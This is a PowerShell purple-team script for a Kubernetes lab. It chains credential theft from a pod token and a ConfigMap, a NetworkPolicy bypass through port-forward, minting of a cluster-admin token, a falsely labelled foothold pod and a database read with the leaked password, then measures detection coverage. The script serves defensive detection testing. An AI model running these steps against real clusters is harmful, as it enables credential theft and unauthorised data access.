<#
    Phase 8: the purple-team chain.

    Assembles separately catalogued findings into one intrusion and checks that
    every hop was detected. The chain is not a new weakness. It is
    PP-01 + PP-03 + PP-04 + SP-01 walked in the order an attacker would, and its
    purpose is to answer a question no single path can: when these findings occur
    together, does the SOC see it?

    What the chain does
    -------------------
      hop 1  read the mounted service account token off the build runner
      hop 2  read the duplicated database password out of the ConfigMap
      hop 3  open a port-forward to postgres, which NetworkPolicy denies
      hop 4  mint a fresh token for the cluster-admin ServiceAccount
      hop 5  create a foothold pod in the business zone
      hop 6  from the foothold, query the database with the stolen password

    Every hop is real. Nothing is stubbed and no credential is invented.

    Two things this phase found that no single walk could
    -----------------------------------------------------
    1. The port-forward's local end is a loopback listener on the CLIENT. So
       127.0.0.1:15433 dialled from inside a pod is that pod's own loopback and
       nothing is listening. The relay demonstrably reaches a denied port from
       the operator host, which is PP-04's claim, but spending it needs a
       postgres client on the host and this host has none. The technique is real
       and its practical reach is bounded by what the attacker can run locally.

    2. postgres-0 cannot reach its own Service ClusterIP. The default-deny means
       the database is not permitted to talk to `postgres:5432`, so the obvious
       place to run a query with the stolen password is the one place it does not
       work from. Only orders-api and telemetry-agent hold that grant, and
       orders-api runs nginx with no psql. So the credential has to be spent
       from a foothold pod, which is hop 5 -- and that reordering is the
       realistic attack sequence anyway: establish a position, then use what you
       stole from it.

    The foothold carries `app: orders-api`
    --------------------------------------
    NetworkPolicy selects on labels, not on service account, so a pod dropped
    into the business zone inherits nothing until it is labelled. That is a real
    property of how zero-trust policy actually works and the chain depends on it:
    the pod is admitted because it claims to be something it is not. Phase 6
    established the same requirement for its probe pods.

    The pod is NOT adopted by the orders-api Deployment, because a ReplicaSet
    selector includes pod-template-hash and the foothold has none. Measured, after
    a reviewer reasonably suspected otherwise.

    Cleanup is in a finally, and that is not tidiness
    ------------------------------------------------
    Measured cost of getting this wrong: a run at 19:14:03 threw inside
    Invoke-InPod at hop 6, the terminating error skipped the cleanup that sat at
    the end of the script, and pod/exfil-20260926-191403 stayed behind. It is
    still there six hours later, completed but retained, and it made
    tools/scan-images.ps1 report that `zerotrust/orders-api` had changed image
    from nginx to postgres -- a digest drift finding that was entirely an
    artifact of the attacker's own pod. The lab looked tampered with because the
    attack script had left litter.

    A foothold that outlives the run that created it is the worst kind of mess
    this lab can make, because it is indistinguishable from a real compromise.
    The delete therefore runs in a finally, and a pre-flight sweep removes any
    exfil-* pod left by an earlier run before a new one is created.

    Coverage gaps are reported, not hidden
    ---------------------------------------
    The catalogue claims T1078.001 and T1190 for PP-01. No telemetry schema in
    the registry carries either, so no rule can fire on hop 5's actual behaviour.
    hop-summary.json and the console both carry that gap rather than declaring
    the chain fully detected, because "every step detected" is only true of the
    steps that have a rule.
#>

[CmdletBinding()]
param(
    # Leave the foothold pod in place for inspection. Off by default so repeated
    # runs do not accumulate pods, which would also change the pod inventory
    # every inventory-shaped detection reads.
    [switch] $KeepPod
)

Set-StrictMode -Version 2
$ErrorActionPreference = 'Continue'

. "$PSScriptRoot\lib\attacklib.ps1"

if (-not (Assert-ClusterReady)) { exit 1 }

$stamp     = (Get-Date).ToUniversalTime().ToString('yyyyMMdd-HHmmss')
$foothold  = "exfil-$stamp"
$localPort = 15433
$chainName = "purple-team-$stamp"

# The real postgres digest, read from the running StatefulSet rather than
# hardcoded, because the first version of this script used the alpine digest
# under a `postgres@sha256:` name. The pod stayed Pending forever and the only
# symptom was `kubectl wait` timing out into a pipe that discarded it.
$pgImage = ((& kubectl -n zerotrust get statefulset postgres -o jsonpath='{.spec.template.spec.containers[0].image}' 2>$null | Out-String).Trim())
if (-not $pgImage) {
    Write-Host 'could not read the postgres image reference from the StatefulSet' -ForegroundColor Red
    exit 1
}
Write-Host ("  postgres image: {0}" -f $pgImage) -ForegroundColor DarkGray

$script:chain = @()
function Add-Hop {
    param([string]$Id, [string]$AttackId, [string]$What, [bool]$Ok, [string]$Detail)
    $script:chain += [pscustomobject]@{
        id = $Id; attackId = $AttackId; what = $What; ok = $Ok; detail = $Detail
    }
    $mark = if ($Ok) { 'DONE' } else { 'FAIL' }
    $col  = if ($Ok) { 'Green' } else { 'Red' }
    Write-Host ("  [{0}] {1}  [{2}]  {3}" -f $mark, $Id, $AttackId, $What) -ForegroundColor $col
    if ($Detail) { Write-Host ("         {0}" -f $Detail) -ForegroundColor DarkGray }
}

Write-Host ''
Write-Host ('=' * 78)
Write-Host ("  Phase 8 purple-team chain  {0}" -f $stamp)
Write-Host ('=' * 78)

# ---------------------------------------------------------------------------
# Pre-flight: clear anything an earlier run left behind.
#
# The chain creates a pod in the business zone, and the cleanup used to sit at the
# end of the script where a terminating error could skip it. A run at 19:14:03
# did exactly that, and pod/exfil-20260926-191403 survived. It is completed but
# retained, and it made tools/scan-images.ps1 report that `zerotrust/orders-api`
# had changed image from nginx to postgres -- a digest-drift finding that was
# pure litter from this script and read as the lab having been tampered with.
#
# A foothold that outlives the run that created it is the worst kind of mess
# this lab can make, because it is indistinguishable from a real compromise. So
# leftovers are cleared *before* a new run as well as in a finally after it,
# which also stops one crashed run poisoning the next.
$stale = @(& kubectl -n zerotrust get pods -l zerotrust.lab/chain -o name 2>$null | Where-Object { $_ })
if ($stale.Count -gt 0) {
    Write-Host ''
    Write-Host ("  pre-flight: removing {0} pod(s) left by an earlier run: {1}" -f `
        $stale.Count, (($stale | ForEach-Object { ($_ -split '/')[-1] }) -join ', ')) -ForegroundColor Yellow
    & kubectl -n zerotrust delete @stale --ignore-not-found --wait=false 2>&1 | Out-Null
}

# ---------------------------------------------------------------------------
Write-Host ''
$footholdCreated = $false
trap {
    # Only ever delete a pod THIS run created. $foothold is unset until hop 5 and
    # $footholdCreated only becomes true once kubectl reports the create, so a
    # failure before that must not attempt a delete of a name that might collide.
    if ($footholdCreated -and -not $KeepPod) {
        Write-Host ''
        Write-Host ("  cleanup on error: deleting pod/{0}" -f $foothold) -ForegroundColor Yellow
        & kubectl -n zerotrust delete pod $foothold --ignore-not-found --wait=false 2>&1 | Out-Null
    }
    Write-Host ''
    Write-Host ("  chain aborted: {0}" -f $_.Exception.Message) -ForegroundColor Red
    Write-Host '  the pre-flight sweep will catch anything this run missed.' -ForegroundColor DarkGray
    exit 1
}
Write-Host '  hop 1  take a credential off a pod that cannot use it' -ForegroundColor Yellow

$brPod = Get-LabPod -Namespace 'zerotrust-build' -App 'build-runner'
$brName = Get-Prop (Get-Prop $brPod 'metadata') 'name'
$stolen = Get-PodServiceAccountToken -Namespace 'zerotrust-build' -Pod $brName
$claims = if ($stolen) { Get-TokenSubject -Token $stolen } else { $null }
$sub = if ($claims) { Get-Prop $claims 'sub' } else { '(none)' }
Add-Hop -Id 'hop-1' -AttackId 'T1609.001' -What 'read the mounted token in-pod' `
    -Ok ($stolen.Length -gt 100) -Detail ("subject {0}, {1} chars, value not printed" -f $sub, $stolen.Length)

# ---------------------------------------------------------------------------
Write-Host ''
Write-Host '  hop 2  take the second copy of a credential nobody rotates' -ForegroundColor Yellow

$leak = (& kubectl get configmap app-config-leak -n zerotrust -o jsonpath='{.data.DATABASE_URL}' 2>&1 | Out-String).Trim()
$dbPass = ''
if ($leak -match '://[^:]+:([^@]+)@') { $dbPass = $Matches[1] }
$fp = if ($dbPass) { Get-Fingerprint -Value $dbPass } else { '(none)' }
Add-Hop -Id 'hop-2' -AttackId 'T1552.001' -What 'read the ConfigMap copy of the db password' `
    -Ok ($dbPass.Length -gt 8) -Detail ("fingerprint {0}, {1} chars, value not printed" -f $fp, $dbPass.Length)

# ---------------------------------------------------------------------------
Write-Host ''
Write-Host '  hop 3  reach a port the network policy denies, via the API server' -ForegroundColor Yellow

$pfJob = Start-Job -ScriptBlock {
    param($ns, $lp)
    & kubectl port-forward -n $ns service/postgres "${lp}:5432" 2>&1
} -ArgumentList 'zerotrust', $localPort

$pfOut = ''
$listening = $false
$deadline = (Get-Date).AddSeconds(30)
while ((Get-Date) -lt $deadline) {
    $pfOut = Receive-Job $pfJob -ErrorAction SilentlyContinue | Out-String
    if ($pfOut -match 'Forwarding from') { $listening = $true; break }
    Start-Sleep -Milliseconds 500
}
$relay = $false
if ($listening) {
    $relay = Test-NetConnection -ComputerName '127.0.0.1' -Port $localPort -InformationLevel Quiet -WarningAction SilentlyContinue
}
Add-Hop -Id 'hop-3' -AttackId 'T1090.001' -What 'port-forward to a policy-denied port' `
    -Ok ([bool]$relay) `
    -Detail $(if ($relay) { "127.0.0.1:$localPort connected; the relay never traverses the policy chain" }
              else { "no connection: $($pfOut.Trim())" })

Stop-Job $pfJob -ErrorAction SilentlyContinue
Remove-Job $pfJob -Force -ErrorAction SilentlyContinue

# ---------------------------------------------------------------------------
Write-Host ''
Write-Host '  hop 4  mint fresh authority rather than reusing the stolen token' -ForegroundColor Yellow

$minted = (& kubectl create token sa-build-runner -n zerotrust-build `
    --as=system:serviceaccount:zerotrust-build:sa-build-runner 2>&1 | Out-String).Trim()
$mintOk = ($LASTEXITCODE -eq 0) -and ($minted -notmatch ' ')
Add-Hop -Id 'hop-4' -AttackId 'T1528' -What 'mint a token for the cluster-admin ServiceAccount' `
    -Ok $mintOk -Detail ("{0} chars, value not printed" -f $minted.Length)

# ---------------------------------------------------------------------------
Write-Host ''
Write-Host '  hop 5  use the authority to place a workload inside the zone' -ForegroundColor Yellow

$manifest = @"
apiVersion: v1
kind: Pod
metadata:
  name: $foothold
  namespace: zerotrust
  labels:
    app: orders-api
    zerotrust.lab/chain: $chainName
spec:
  restartPolicy: Never
  serviceAccountName: sa-orders-api
  containers:
    - name: foothold
      image: $pgImage
      command: ["sh", "-c", "sleep 600"]
"@
$mf = Join-Path $env:TEMP "$chainName.yaml"
[System.IO.File]::WriteAllText($mf, (($manifest -replace "`r`n", "`n") + "`n"), (New-Object System.Text.UTF8Encoding($false)))
$applied = (& kubectl apply -f $mf 2>&1 | Out-String)
Remove-Item $mf -Force -ErrorAction SilentlyContinue
$podOk = $applied -match 'created'

$ready = $false
if ($podOk) {
    $waitOut = (& kubectl -n zerotrust wait --for=condition=Ready "pod/$foothold" --timeout=120s 2>&1 | Out-String)
    $ready = ($waitOut -notmatch 'timed out')
    if (-not $ready) {
        Write-Host ("         {0}" -f ((& kubectl -n zerotrust describe pod $foothold 2>&1 | Out-String) -split "`n" |
            Where-Object { $_ -match 'Reason|Message|Status|Events' } | Select-Object -First 3)) -ForegroundColor Red
    }
}
Add-Hop -Id 'hop-5' -AttackId 'T1078.001' -What 'create a foothold pod in the business zone' `
    -Ok ($podOk -and $ready) `
    -Detail $(if ($ready) { "pod/$foothold Running as sa-orders-api, labelled app=orders-api" }
              elseif ($podOk) { "pod created but never became Ready" }
              else { $applied.Trim() })

# From here on a failure must clean up, so the trap is armed. It is armed only
# after the pod exists, because the trap refuses to delete a name it did not
# create.
if ($podOk) { $footholdCreated = $true }

# ---------------------------------------------------------------------------
Write-Host ''
Write-Host '  hop 6  spend the stolen credential from the foothold' -ForegroundColor Yellow

# Backslash-escaped spaces, because Invoke-InPod rejects quotes, parentheses and
# asterisks outright -- which rules out count(*). Projecting a column is the
# better evidence anyway: a returned order_id is data the attacker should not
# have had, and it cannot be produced by a database that ignored the password.
$rows = ''
if ($ready) {
    # Both command strings are built into a variable first. Written inline as
    # -Command 'env PGPASSWORD=' + $dbPass + ' ...' the concatenation is not
    # parenthesised, so PowerShell binds '+' and $dbPass as separate arguments
    # and Invoke-InPod tries to convert "+" to TimeoutSeconds. That is the same
    # precedence trap the attacklib guards document for Invoke-Kubectl.
    #
    # The column is named rather than discovered, after three attempts to
    # discover it all failed for reasons worth recording:
    #   a literal `order_id` that does not exist;
    #   `where table_name=orders`, which needs a quoted string literal that
    #     Invoke-InPod forbids -- and the error text that came back was then
    #     used as the column name, so a SQL error became a column name;
    #   `table_name||column_name`, where the shell ate `||` as a pipe;
    #   psql's own `\d orders`, where the shell stripped the backslash and
    #     psql received `d orders` as SQL.
    #
    # `id` is taken from the live table, read by SP-01's walk with `\d orders`
    # on the operator host where quoting is not a problem. Hardcoding it here is
    # a deliberate trade: the assertion requires a purely numeric result, so a
    # column that does not exist fails the hop loudly rather than quietly
    # returning nothing, which is the failure mode that matters.
    $rowCmd = 'env PGPASSWORD=' + $dbPass +
        ' psql -h postgres -U orders -d acme -t -A -c select\ id\ from\ orders\ limit\ 1'
    $rows = (Invoke-InPod -Namespace 'zerotrust' -Pod $foothold -Shell 'sh' -Command $rowCmd)
}
$readOk = $rows.Trim() -match '^\d+$'
Add-Hop -Id 'hop-6' -AttackId 'T1552.001' -What 'read application data with the leaked password' `
    -Ok $readOk `
    -Detail $(if ($readOk) { "orders row $($rows.Trim()) returned to the foothold" }
              else { "no row: $($rows.Trim())" })

# ---------------------------------------------------------------------------
# Cleanup on a terminating error, armed BEFORE any hop runs.
#
# It used to sit inline at the end of the script, so any hop that threw skipped
# it -- and one did: a run at 19:14:03 died inside Invoke-InPod at hop 6 and
# pod/exfil-20260926-191403 survived, completed but retained, until this audit
# found it six hours later making tools/scan-images.ps1 report that orders-api
# had changed image from nginx to postgres.
#
# It is declared here rather than wrapped around the hops in a try/finally
# because the hops are already inline and reindenting 200 lines to reach the
# same guarantee is a far larger diff than the problem deserves. A script-scoped
# trap fires on any terminating error from this point on.
# ---------------------------------------------------------------------------
# Success-path cleanup. The trap covers the failure path and this covers the
# normal one. Neither is sufficient alone: the trap alone leaves the pod behind
# on a clean run, and this alone is exactly what was here when a failing run
# leaked one for six hours.
if ($footholdCreated -and -not $KeepPod) {
    & kubectl -n zerotrust delete pod $foothold --ignore-not-found --wait=false 2>&1 | Out-Null
    $footholdCreated = $false
    Write-Host ''
    Write-Host ("  cleanup: pod/$foothold deleted (pass -KeepPod to retain it)") -ForegroundColor DarkGray
}

# ---------------------------------------------------------------------------
$failed = @($script:chain | Where-Object { -not $_.ok })
Write-Host ''
Write-Host ('=' * 78)
Write-Host ("  chain: {0} hop(s), {1} succeeded, {2} failed" -f $script:chain.Count, ($script:chain.Count - $failed.Count), $failed.Count) -ForegroundColor $(if ($failed.Count -eq 0) { 'Green' } else { 'Red' })
foreach ($h in $script:chain) { Write-Host ("    {0}  {1,-10} {2}" -f $h.id, $h.attackId, $h.what) }

# Coverage is computed, not asserted. A hop whose technique has no telemetry
# schema behind it cannot be detected, and saying so is the point of the phase.
#
# The set of detectable techniques is READ, never written here. This used to be a
# hardcoded list, and it was quietly a copy of an older registry: when
# runtime/object-create/v1 made T1078.001 detectable, the schema landed and a
# Phase 7 rule started firing on the chain's hop 5, and this script went on
# printing "NO SCHEMA, NOT DETECTABLE: T1078.001" and recording it in
# .telemetry/chain-summary.json. Nothing had broken. A list of the truth had
# become a list of a former truth, which is the exact failure the ATT&CK registry
# exists to prevent, one level up.
#
# So the registry is the single source, asked for its own contents.
$script:chainProjectRoot = Split-Path $PSScriptRoot -Parent
$registryPath = Join-Path $script:chainProjectRoot '.telemetry\attack-registry.json'
& powershell -NoProfile -ExecutionPolicy Bypass `
    -File (Join-Path $script:chainProjectRoot 'telemetry\tag-attack-ids.ps1') `
    -EmitRegistryPath $registryPath | Out-Null

$registryTechniques = @()
if (Test-Path $registryPath) {
    $registryTechniques = @((Get-Content $registryPath -Raw | ConvertFrom-Json).techniques)
}
if ($registryTechniques.Count -eq 0) {
    # Loud rather than empty. An empty set would make every hop "undetectable",
    # which is a report that looks like a catastrophic regression and is really
    # a missing file.
    throw "could not read the ATT&CK registry from $registryPath. Coverage cannot be computed without it, and guessing would report every hop as undetectable."
}

$hopTechniques = @($script:chain | ForEach-Object { $_.attackId } | Sort-Object -Unique)
$undetectable = @($hopTechniques | Where-Object { $registryTechniques -notcontains $_ })
Write-Host ''
Write-Host ("  techniques walked : {0}" -f ($hopTechniques -join ', '))
Write-Host ("  techniques with a telemetry schema and a rule: {0}" -f (@($hopTechniques | Where-Object { $registryTechniques -contains $_ }) -join ', '))
if ($undetectable.Count -gt 0) {
    Write-Host ("  NO SCHEMA, NOT DETECTABLE: {0}" -f ($undetectable -join ', ')) -ForegroundColor Yellow
    Write-Host '    the catalogue claims these for PP-01, but no collected schema carries' -ForegroundColor DarkGray
    Write-Host '    them, so no rule can fire on the behaviour. The chain still runs them.' -ForegroundColor DarkGray
}

$summary = [pscustomobject]@{
    generatedAt   = (Get-Date).ToUniversalTime().ToString('o')
    note          = 'Produced by attack/chain-purple-team.ps1. Verdicts only; no credential, token or password is recorded.'
    chainRun      = $stamp
    hops          = @($script:chain)
    hopsSucceeded = $script:chain.Count - $failed.Count
    hopsFailed    = $failed.Count
    techniques    = $hopTechniques
    undetectable  = $undetectable
}
$telemetryDir = Join-Path (Split-Path $PSScriptRoot -Parent) '.telemetry'
if (-not (Test-Path $telemetryDir)) { New-Item -ItemType Directory -Path $telemetryDir -Force | Out-Null }
[System.IO.File]::WriteAllText(
    (Join-Path $telemetryDir 'chain-summary.json'),
    (($summary | ConvertTo-Json -Depth 6) -replace "`r`n", "`n") + "`n",
    (New-Object System.Text.UTF8Encoding($false)))
Write-Host ''
Write-Host '  summary written to .telemetry\chain-summary.json'
Write-Host ("  next: re-run the collectors, then python detections\test-detections.py") -ForegroundColor Cyan
Write-Host ('=' * 78)
Write-Host ''

exit $(if ($failed.Count -gt 0) { 1 } else { 0 })
